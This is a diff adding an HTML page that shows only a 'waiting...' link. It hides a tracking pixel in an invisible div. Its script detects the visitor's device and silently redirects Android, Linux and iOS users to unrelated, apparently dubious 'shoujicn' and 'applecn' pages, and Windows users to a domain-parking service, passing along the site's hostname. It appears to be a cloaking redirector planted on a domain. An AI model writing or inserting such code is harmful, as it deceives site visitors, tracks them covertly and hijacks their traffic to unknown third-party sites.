@@ -1,0 +1,57 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+
+<body>
+<a href="http://www.38ee.com">waiting...////</a>
+<div style="display:none;">
+<a href="https://www.51.la/?19028164" ><img src="//ia.51.la/go1?id=19028164&pvFlag=1" style="border:none" /></a>
+</div>
+<script>
+
+function judge() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    var isLinux = (String(navigator.platform).indexOf("linux") > -1);
+    var bIsAndroid = sUserAgent.match(/android/i) == "android";
+    var bIsWP = sUserAgent.match(/windows\sphone/i) == "windows phone";
+    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+    var bIsIphoneOs = sUserAgent.match(/iphone\sos/i) == "iphone os";
+    var bIsCE = sUserAgent.match(/windows\snt/i) == "windows nt";
+
+    if (bIsCE) {
+        return "pc";
+    } else if (bIsWP) {
+        return "wp";
+    } else if (bIsAndroid) {
+        return "android";
+    } else if (isLinux) {
+        return "linux";
+    } else if (bIsIpad || bIsIphoneOs) {
+        return "ios";
+    }
+}
+
+var agent = judge();
+
+host = window.location.hostname;
+newhost=host.replace("www.","");
+if (agent == "android" || agent == "linux") {
+	newhost=newhost.replace(".","_");
+	newhost=newhost.replace(".","_");
+        window.location.href = "http://2ol9.blkan.meitiankanlkan.com/shoujicn/index.asp?domain=_" + newhost;
+} else if (agent == "ios") {
+        window.location.href = "http://t.thisisfortestuseonly.com/applecn/index.htm";
+} else if (agent == "wp") {
+
+} else if (agent == "pc") {
+	 window.location = "http://park.zunmi.cn/?site=" + newhost + "&acct=1108";
+
+} else {
+
+}
+</script>
+
+
+</body>
+</html>
